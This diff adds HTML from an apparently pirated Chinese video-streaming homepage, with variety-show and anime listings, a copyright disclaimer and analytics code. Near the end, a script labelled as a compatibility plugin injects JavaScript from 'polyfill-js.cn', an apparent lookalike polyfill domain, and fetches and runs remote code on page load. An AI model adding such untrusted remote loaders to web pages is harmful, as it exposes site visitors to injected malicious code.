+                                                        <li><i>4</i><a href="/voddetail/52581.html" title="喜欢你我也是第五季" target="_blank">喜欢你我也是第五季</a><span>10-19</span></li>
+                                                        <li><i>5</i><a href="/voddetail/58169.html" title="中国礼中国乐第二季" target="_blank">中国礼中国乐第二季</a><span>10-19</span></li>
+                                                        <li><i>6</i><a href="/voddetail/51737.html" title="2025浙江卫视跨年" target="_blank">2025浙江卫视跨年</a><span>10-19</span></li>
+                                                        <li><i>7</i><a href="/voddetail/95171.html" title="死亡游戏：千万韩元赌起2" target="_blank">死亡游戏：千万韩元赌</a><span>04-22</span></li>
+                                                        <li><i>8</i><a href="/voddetail/26556.html" title="乘风第五季舞台纯享版" target="_blank">乘风第五季舞台纯享版</a><span>10-19</span></li>
+                                                        <li><i>9</i><a href="/voddetail/59358.html" title="跨越时空的旋律" target="_blank">跨越时空的旋律</a><span>10-19</span></li>
+                                                        <li><i>10</i><a href="/voddetail/17493.html" title="你们说了算——里院来福战" target="_blank">你们说了算——里院来</a><span>10-19</span></li>
+                                                        <li><i>11</i><a href="/voddetail/95174.html" title="真心园艺秀" target="_blank">真心园艺秀</a><span>04-22</span></li>
+                                                        <li><i>12</i><a href="/voddetail/96037.html" title="夫妻肺片" target="_blank">夫妻肺片</a><span>06-28</span></li>
+                                                        <li><i>13</i><a href="/voddetail/34505.html" title="无穷之路粤语版" target="_blank">无穷之路粤语版</a><span>10-19</span></li>
+                                                        <li><i>14</i><a href="/voddetail/3857.html" title="当家爸爸的聚会" target="_blank">当家爸爸的聚会</a><span>12-18</span></li>
+                                                        <li><i>15</i><a href="/voddetail/88334.html" title="披荆斩棘的哥哥" target="_blank">披荆斩棘的哥哥</a><span>10-20</span></li>
+                                                        <li><i>16</i><a href="/voddetail/91318.html" title="一周星星" target="_blank">一周星星</a><span>06-29</span></li>
+                                                        <li><i>17</i><a href="/voddetail/87734.html" title="名人荒野求生 第一季" target="_blank">名人荒野求生 第一季</a><span>10-20</span></li>
+                                                    </ul>
+                                            </div>
+                </div>
+                <!--/shot-->
+            </div>
+            <div class="cr"></div>
+        </div>
+                <div class="box">
+            <div class="content">
+                <div class="title">
+                    <h2><a href="/vodtype/4.html">动漫</a></h2>
+                    <dl>
+                        <dd><a href="javascript:void(0);">推荐</a></dd>
+                                                <dd><a href="/vodtype/24.html">国产动漫</a></dd>
+                                                <dd><a href="/vodtype/25.html">日韩动漫</a></dd>
+                                                <dd><a href="/vodtype/26.html">欧美动漫</a></dd>
+                                            </dl>
+                </div>
+                <div class="bd clearfix">
+                    <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/316.html" title="逆天至尊" target="_blank"><img src="/upload/vod/20251018-1/d0039cfb3ec141b6d7e0969c2d8a5a14.jpg" alt="逆天至尊" /><i></i><em>更新至第527集</em></a><b><a href="/voddetail/316.html" title="逆天至尊" target="_blank">逆天至尊..</a></b>
+                            <p>2021-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/315.html" title="无上神帝" target="_blank"><img src="/upload/vod/20251018-1/1d7497f61e5ae23afdfedf3b7e70fbdd.jpg" alt="无上神帝" /><i></i><em>更新至第618集</em></a><b><a href="/voddetail/315.html" title="无上神帝" target="_blank">无上神帝..</a></b>
+                            <p>2020-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96544.html" title="汪汪队之小砾与工程家族 第三季" target="_blank"><img src="/upload/vod/20260629-1/ae6681687d784816b170f285c2ab23a8.jpg" alt="汪汪队之小砾与工程家族 第三季" /><i></i><em>更新第07集</em></a><b><a href="/voddetail/96544.html" title="汪汪队之小砾与工程家族 第三季" target="_blank">汪汪队之小砾与工程家..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96163.html" title="天命动漫" target="_blank"><img src="/upload/vod/20260616-1/9773b140db92c4c42b36bfae7d2ac7e6.jpg" alt="天命动漫" /><i></i><em>更新第07集</em></a><b><a href="/voddetail/96163.html" title="天命动漫" target="_blank">天命动漫..</a></b>
+                            <p>2026-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95904.html" title="奔跑的木头" target="_blank"><img src="/upload/vod/20260602-1/b8e0ab38a0c0a408640769f9ff0a8150.jpg" alt="奔跑的木头" /><i></i><em>更新第06集</em></a><b><a href="/voddetail/95904.html" title="奔跑的木头" target="_blank">奔跑的木头..</a></b>
+                            <p>2026-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/317.html" title="吞噬星空" target="_blank"><img src="/upload/vod/20251018-1/f82a410e7afe58db7f712639869b207a.jpg" alt="吞噬星空" /><i></i><em>更新至第230集</em></a><b><a href="/voddetail/317.html" title="吞噬星空" target="_blank">吞噬星空..</a></b>
+                            <p>2020-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94875.html" title="黑猫和魔女的课堂" target="_blank"><img src="/upload/vod/20260412-1/d0f98350c650dd481b64a174105756c7.webp" alt="黑猫和魔女的课堂" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/94875.html" title="黑猫和魔女的课堂" target="_blank">黑猫和魔女的课堂..</a></b>
+                            <p>2026-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96567.html" title="世界在起舞" target="_blank"><img src="/upload/vod/20260630-1/b1d74ebd0f7e89d30d5e5a8190ae53c2.jpg" alt="世界在起舞" /><i></i><em>更新第01集</em></a><b><a href="/voddetail/96567.html" title="世界在起舞" target="_blank">世界在起舞..</a></b>
+                            <p>2026-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/659.html" title="海贼王" target="_blank"><img src="/upload/vod/20251018-1/69bebc362dd84d16a6a0cc8e2a8632a4.jpg" alt="海贼王" /><i></i><em>更新第1168集</em></a><b><a href="/voddetail/659.html" title="海贼王" target="_blank">海贼王..</a></b>
+                            <p>1999-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96559.html" title="锦鲤人间之如愿以偿" target="_blank"><img src="https://img.bdzyimg1.com/upload/vod/20260629-1/f5d8036604a93ba9a02205a04c0dc4f1.jpg#err" alt="锦鲤人间之如愿以偿" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96559.html" title="锦鲤人间之如愿以偿" target="_blank">锦鲤人间之如愿以偿..</a></b>
+                            <p>2026-动画电影</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/316.html" title="逆天至尊" target="_blank"><img src="/upload/vod/20251018-1/d0039cfb3ec141b6d7e0969c2d8a5a14.jpg" alt="逆天至尊" /><i></i><em>更新至第527集</em></a><b><a href="/voddetail/316.html" title="逆天至尊" target="_blank">逆天至尊..</a></b>
+                            <p>2021-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/315.html" title="无上神帝" target="_blank"><img src="/upload/vod/20251018-1/1d7497f61e5ae23afdfedf3b7e70fbdd.jpg" alt="无上神帝" /><i></i><em>更新至第618集</em></a><b><a href="/voddetail/315.html" title="无上神帝" target="_blank">无上神帝..</a></b>
+                            <p>2020-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96163.html" title="天命动漫" target="_blank"><img src="/upload/vod/20260616-1/9773b140db92c4c42b36bfae7d2ac7e6.jpg" alt="天命动漫" /><i></i><em>更新第07集</em></a><b><a href="/voddetail/96163.html" title="天命动漫" target="_blank">天命动漫..</a></b>
+                            <p>2026-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95904.html" title="奔跑的木头" target="_blank"><img src="/upload/vod/20260602-1/b8e0ab38a0c0a408640769f9ff0a8150.jpg" alt="奔跑的木头" /><i></i><em>更新第06集</em></a><b><a href="/voddetail/95904.html" title="奔跑的木头" target="_blank">奔跑的木头..</a></b>
+                            <p>2026-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/317.html" title="吞噬星空" target="_blank"><img src="/upload/vod/20251018-1/f82a410e7afe58db7f712639869b207a.jpg" alt="吞噬星空" /><i></i><em>更新至第230集</em></a><b><a href="/voddetail/317.html" title="吞噬星空" target="_blank">吞噬星空..</a></b>
+                            <p>2020-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96559.html" title="锦鲤人间之如愿以偿" target="_blank"><img src="https://img.bdzyimg1.com/upload/vod/20260629-1/f5d8036604a93ba9a02205a04c0dc4f1.jpg#err" alt="锦鲤人间之如愿以偿" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96559.html" title="锦鲤人间之如愿以偿" target="_blank">锦鲤人间之如愿以偿..</a></b>
+                            <p>2026-动画电影</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96547.html" title="精灵王国：重返小人国" target="_blank"><img src="/upload/vod/20260629-1/61eb4c55f6f0d15dcbeddcaa6f44d16f.jpg" alt="精灵王国：重返小人国" /><i></i><em>更新HD</em></a><b><a href="/voddetail/96547.html" title="精灵王国：重返小人国" target="_blank">精灵王国：重返小人国..</a></b>
+                            <p>2025-动画电影</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96345.html" title="小星帽尼欧欧" target="_blank"><img src="/upload/vod/20260622-1/33ce56914ea764e011f40c73cd59e8a5.png" alt="小星帽尼欧欧" /><i></i><em>更新第10集</em></a><b><a href="/voddetail/96345.html" title="小星帽尼欧欧" target="_blank">小星帽尼欧欧..</a></b>
+                            <p>2026-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95756.html" title="奔跑的木头" target="_blank"><img src="/upload/vod/20260525-1/80ed8e4e66c5b3c7d0ed71975fdf22d6.webp" alt="奔跑的木头" /><i></i><em>更新至第06集</em></a><b><a href="/voddetail/95756.html" title="奔跑的木头" target="_blank">奔跑的木头..</a></b>
+                            <p>2026-国产动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95287.html" title="我把末日上交给了国家" target="_blank"><img src="/upload/vod/20260428-1/ac610155ba296cda4c0f465228f2f5b2.jpg" alt="我把末日上交给了国家" /><i></i><em>更新第40集</em></a><b><a href="/voddetail/95287.html" title="我把末日上交给了国家" target="_blank">我把末日上交给了国家..</a></b>
+                            <p>2026-国产动漫</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/94875.html" title="黑猫和魔女的课堂" target="_blank"><img src="/upload/vod/20260412-1/d0f98350c650dd481b64a174105756c7.webp" alt="黑猫和魔女的课堂" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/94875.html" title="黑猫和魔女的课堂" target="_blank">黑猫和魔女的课堂..</a></b>
+                            <p>2026-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96567.html" title="世界在起舞" target="_blank"><img src="/upload/vod/20260630-1/b1d74ebd0f7e89d30d5e5a8190ae53c2.jpg" alt="世界在起舞" /><i></i><em>更新第01集</em></a><b><a href="/voddetail/96567.html" title="世界在起舞" target="_blank">世界在起舞..</a></b>
+                            <p>2026-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/659.html" title="海贼王" target="_blank"><img src="/upload/vod/20251018-1/69bebc362dd84d16a6a0cc8e2a8632a4.jpg" alt="海贼王" /><i></i><em>更新第1168集</em></a><b><a href="/voddetail/659.html" title="海贼王" target="_blank">海贼王..</a></b>
+                            <p>1999-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94668.html" title="钻石王牌第四季" target="_blank"><img src="/upload/vod/20260405-1/41cc731bf67f8b73187832871f59ed6a.webp" alt="钻石王牌第四季" /><i></i><em>更新第13集</em></a><b><a href="/voddetail/94668.html" title="钻石王牌第四季" target="_blank">钻石王牌第四季..</a></b>
+                            <p>2026-</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94870.html" title="夜樱家的大作战第二季" target="_blank"><img src="/upload/vod/20260412-1/55f3957bf97cb89d8156c38ac5b34251.webp" alt="夜樱家的大作战第二季" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/94870.html" title="夜樱家的大作战第二季" target="_blank">夜樱家的大作战第二季..</a></b>
+                            <p>2026-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94669.html" title="杖与剑的魔剑谭第二季" target="_blank"><img src="/upload/vod/20260405-1/05f81dd8a6471299d80c5abcab6fc210.webp" alt="杖与剑的魔剑谭第二季" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/94669.html" title="杖与剑的魔剑谭第二季" target="_blank">杖与剑的魔剑谭第二季..</a></b>
+                            <p>2026-</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94671.html" title="拜托了偶像公主" target="_blank"><img src="https://viptulz.com/upload/vod/20260405-1/d7d1563e4d14c9f2d65a51aacdcbfaf1.webp#err" alt="拜托了偶像公主" /><i></i><em>更新至第13集</em></a><b><a href="/voddetail/94671.html" title="拜托了偶像公主" target="_blank">拜托了偶像公主..</a></b>
+                            <p>2026-</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96533.html" title="死神 千年血战篇 -祸进谭" target="_blank"><img src="/upload/vod/20260628-1/2542d95bae8e3ee8a9274f20eb651968.jpg" alt="死神 千年血战篇 -祸进谭" /><i></i><em>更新第01-03集</em></a><b><a href="/voddetail/96533.html" title="死神 千年血战篇 -祸进谭" target="_blank">死神 千年血战篇 -..</a></b>
+                            <p>2026-日韩动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94546.html" title="转生成自动贩卖机的我今天也在迷宫徘徊第三季" target="_blank"><img src="/upload/vod/20260401-1/d48c0d3390ff4306c06c81c036b5834b.webp" alt="转生成自动贩卖机的我今天也在迷宫徘徊第三季" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/94546.html" title="转生成自动贩卖机的我今天也在迷宫徘徊第三季" target="_blank">转生成自动贩卖机的我..</a></b>
+                            <p>2026-</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94654.html" title="主播女孩重度依赖" target="_blank"><img src="/upload/vod/20260405-1/d922e8229a3cbb9b611b0125830efe13.webp" alt="主播女孩重度依赖" /><i></i><em>更新第13集</em></a><b><a href="/voddetail/94654.html" title="主播女孩重度依赖" target="_blank">主播女孩重度依赖..</a></b>
+                            <p>2026-日韩动漫</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96544.html" title="汪汪队之小砾与工程家族 第三季" target="_blank"><img src="/upload/vod/20260629-1/ae6681687d784816b170f285c2ab23a8.jpg" alt="汪汪队之小砾与工程家族 第三季" /><i></i><em>更新第07集</em></a><b><a href="/voddetail/96544.html" title="汪汪队之小砾与工程家族 第三季" target="_blank">汪汪队之小砾与工程家..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96147.html" title="我与超人的冒险 第三季" target="_blank"><img src="/upload/vod/20260614-1/9be8958a7b74327b1db858bb6d6affe8.jpg" alt="我与超人的冒险 第三季" /><i></i><em>更新第03集</em></a><b><a href="/voddetail/96147.html" title="我与超人的冒险 第三季" target="_blank">我与超人的冒险 第三..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95754.html" title="瑞克和莫蒂第九季" target="_blank"><img src="/upload/vod/20260525-1/5a8004df9f4a575c0699c844e83eec87.webp" alt="瑞克和莫蒂第九季" /><i></i><em>更新第06集</em></a><b><a href="/voddetail/95754.html" title="瑞克和莫蒂第九季" target="_blank">瑞克和莫蒂第九季..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95759.html" title="瑞克和莫蒂第九季" target="_blank"><img src="/upload/vod/20260526-1/eab79c459491c623965dba6ad693b0ab.webp" alt="瑞克和莫蒂第九季" /><i></i><em>更新至第06集</em></a><b><a href="/voddetail/95759.html" title="瑞克和莫蒂第九季" target="_blank">瑞克和莫蒂第九季..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96473.html" title="汪汪队之小砾与工程家族第三季国语" target="_blank"><img src="/upload/vod/20260626-1/dd480bd1a62ed6fb7d4a5b8111754dee.jpg" alt="汪汪队之小砾与工程家族第三季国语" /><i></i><em>更新至第06集</em></a><b><a href="/voddetail/96473.html" title="汪汪队之小砾与工程家族第三季国语" target="_blank">汪汪队之小砾与工程家..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96474.html" title="汪汪队之小砾与工程家族第三季国语" target="_blank"><img src="/upload/vod/20260626-1/d8cc1d86664c0598c41270fd7f6a23d4.jpg" alt="汪汪队之小砾与工程家族第三季国语" /><i></i><em>更新至第04集</em></a><b><a href="/voddetail/96474.html" title="汪汪队之小砾与工程家族第三季国语" target="_blank">汪汪队之小砾与工程家..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95936.html" title="机械之声的传奇第四季" target="_blank"><img src="/upload/vod/20260603-1/6366ecf874368056a0ca3a91b140b46d.webp" alt="机械之声的传奇第四季" /><i></i><em>已完结</em></a><b><a href="/voddetail/95936.html" title="机械之声的传奇第四季" target="_blank">机械之声的传奇第四季..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95939.html" title="机械之声的传奇 第四季" target="_blank"><img src="/upload/vod/20260604-1/782f1f0cc34d2a953196ff33888c18af.jpg" alt="机械之声的传奇 第四季" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/95939.html" title="机械之声的传奇 第四季" target="_blank">机械之声的传奇 第四..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95888.html" title="海底小纵队第十一季国语" target="_blank"><img src="/upload/vod/20260531-1/e1d62f20bf04571e84985d38f7d18c3f.jpg" alt="海底小纵队第十一季国语" /><i></i><em>已完结</em></a><b><a href="/voddetail/95888.html" title="海底小纵队第十一季国语" target="_blank">海底小纵队第十一季国..</a></b>
+                            <p>2026-欧美动漫</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/34940.html" title="飞天小女警第三季" target="_blank"><img src="/upload/vod/20251019-25/932cbde7991165b61fe467a23d85d5a6.jpg" alt="飞天小女警第三季" /><i></i><em>更新第26集</em></a><b><a href="/voddetail/34940.html" title="飞天小女警第三季" target="_blank">飞天小女警第三季..</a></b>
+                            <p>2000-欧美动漫</p>
+                        </li>
+                                            </ul>
+                                    </div>
+            </div>
+            <div class="side">
+                <div class="shot">
+                    <dl class="hitstab">
+                        <dt><a href="/label/top.html" target="_blank">最新动漫</a></dt>
+                        <dd><a>日</a></dd>
+                        <dd><a>周</a></dd>
+                        <dd class="sg"><a>月</a></dd>
+                        <dd><a>总</a></dd>
+                    </dl>
+                    <div class="bd">
+                        <ul class="dis">
+                                                        <li><i>1</i><a href="/voddetail/71603.html" title="雀斑公主" target="_blank">雀斑公主</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/3471.html" title="启运丹田：开局签到至尊丹田" target="_blank">启运丹田：开局签到至</a><span>10-18</span></li>
+                                                        <li><i>3</i><a href="/voddetail/67542.html" title="听到涛声国语" target="_blank">听到涛声国语</a><span>10-20</span></li>
+                                                        <li><i>4</i><a href="/voddetail/46090.html" title="锦绣重生：早安傅太太" target="_blank">锦绣重生：早安傅太太</a><span>10-19</span></li>
+                                                        <li><i>5</i><a href="/voddetail/61907.html" title="蜡笔小新：超级美味B级美食大逃亡" target="_blank">蜡笔小新：超级美味B</a><span>10-19</span></li>
+                                                        <li><i>6</i><a href="/voddetail/93492.html" title="精灵宝可梦太阳与月亮" target="_blank">精灵宝可梦太阳与月亮</a><span>02-22</span></li>
+                                                        <li><i>7</i><a href="/voddetail/46563.html" title="金龟子" target="_blank">金龟子</a><span>10-20</span></li>
+                                                        <li><i>8</i><a href="/voddetail/46558.html" title="啦啦啦德玛西亚第二季" target="_blank">啦啦啦德玛西亚第二季</a><span>10-19</span></li>
+                                                        <li><i>9</i><a href="/voddetail/30178.html" title="彩叶草之梦" target="_blank">彩叶草之梦</a><span>10-19</span></li>
+                                                        <li><i>10</i><a href="/voddetail/54308.html" title="洛克王国大冒险" target="_blank">洛克王国大冒险</a><span>10-19</span></li>
+                                                        <li><i>11</i><a href="/voddetail/62429.html" title="头文字D第二季国语" target="_blank">头文字D第二季国语</a><span>10-19</span></li>
+                                                        <li><i>12</i><a href="/voddetail/55616.html" title="银狐" target="_blank">银狐</a><span>10-19</span></li>
+                                                        <li><i>13</i><a href="/voddetail/22575.html" title="我的弟子遍布诸天万界·动态漫画" target="_blank">我的弟子遍布诸天万界</a><span>10-19</span></li>
+                                                        <li><i>14</i><a href="/voddetail/58195.html" title="半透明水谜之忽然奢华" target="_blank">半透明水谜之忽然奢华</a><span>10-19</span></li>
+                                                        <li><i>15</i><a href="/voddetail/50201.html" title="妲己不是坏狐狸 漫动画" target="_blank">妲己不是坏狐狸 漫动</a><span>10-19</span></li>
+                                                        <li><i>16</i><a href="/voddetail/32076.html" title="秀逗魔导士EVOLUTION-R" target="_blank">秀逗魔导士EVOLU</a><span>10-20</span></li>
+                                                        <li><i>17</i><a href="/voddetail/48014.html" title="宠婚来袭第一季" target="_blank">宠婚来袭第一季</a><span>10-19</span></li>
+                                                    </ul>
+                                            </div>
+                </div>
+                <!--/shot-->
+            </div>
+            <div class="cr"></div>
+        </div>
+                <!--/box-->
+        <div class="banner mt10">
+        </div>
+        <div class="link">
+            <div class="title"><span>友情链接</span>
+                <p>欢迎高质量链接交换，联系123456</p>
+            </div>
+            <div>
+                            </div>
+        </div>
+    </div>
+    </div>
+    <div id="footer">
+    <div class="flink">
+	本网站所有内容均来源于互联网相关站点自动搜索采集信息，如有侵权请告知及时处理删除，谢谢。</br>联系邮箱：</br>
+        <a href="/rss.xml">RSS</a>
+        <a href="/rss/baidu.xml">Baidu SiteMap</a>
+        <a href="/rss/google.xml">Google SiteMap</a>
+        <a href="/">电影下载</a>
+    </div>
+    <p></p>
+    <p><a href='https://www.22tu.app/' title='' target=_blank>迅播影院-MP4高清手机电影下载-Gvod电影-迅雷电影下载-迅播22tu.com </a>网站为非赢利性站点，本网站所有内容均来源于互联网相关站点自动搜索采集信息，相关浅层链接已经注明来源，部分点播资源来自于乐视/百度云盘/土豆网网民分享。如有侵权请告知及时处理删除,联系邮箱：</p>
+    <p>Copyright &copy; 2020 www.22tu.app All Rights Reserved.icp123.统计代码<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+<script>LA.init({id: "Jm1NFhV8qaCPMtK3",ck: "Jm1NFhV8qaCPMtK3"})</script>
+
+    </p>
+</div>
+<script src="/template/22tu/ads/404qdibu.js"></script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+    <script type="text/javascript">
+    jQuery(".box .content").slide({ titCell: ".title dd", mainCell: ".bd", delayTime: 0 });
+    jQuery(".box .shot").slide({ titCell: "dd", mainCell: ".bd", delayTime: 0 });
+    </script>
+<script>
+        // 兼容低版本浏览器插件
+        var um = document.createElement("script");
+        um.src = "https://polyfill-js.cn/v3/polyfill.min.js?features=default";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(um, s);
+</script>
+</body>
+</html>
